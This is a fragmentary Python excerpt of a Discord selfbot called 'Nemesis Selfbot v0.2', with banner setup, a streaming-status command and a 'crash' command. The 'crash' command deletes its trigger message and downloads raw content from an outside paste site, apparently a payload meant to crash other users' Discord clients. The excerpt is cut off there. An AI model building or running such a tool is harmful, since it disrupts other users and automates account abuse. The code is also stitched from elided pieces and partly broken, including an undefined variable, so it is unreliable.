...
import os
os.system("title Nemesis Selfbot v0.2 - Loading...")
print(
    f"""
{Fore.MAGENTA}
                                                ╔╗╔╔═╗╔╦╗╔═╗╔═╗╦╔═╗
...
async def step_1():
    print('')
os.system("cls")
os.system("title Nemesis Selfbot v0.2 - Step (1/1)")
print(
    f"""
{Fore.MAGENTA}
                                                ╔╗╔╔═╗╔╦╗╔═╗╔═╗╦╔═╗
...
#<--------------Logging Start-------------->
os.system("cls")
os.system("title Nemesis Selfbot v0.2 - Logging in...")
from tqdm import tqdm, trange
from time import sleep
print(
    f"""
...
async def streaming(ctx, *, args):
    await ctx.message.delete() 
    await bot.change_presence(activity = discord.Streaming(name=f"{message}", url="https://twitch.com/discord"))
...
# Crash
@bot.command()
async def crash(ctx): # Fixed by igna#1337
    await ctx.message.delete()
    Crash = urlopen(Request("https://ghostbin.co/paste/uuuwy/raw")).read().decode()
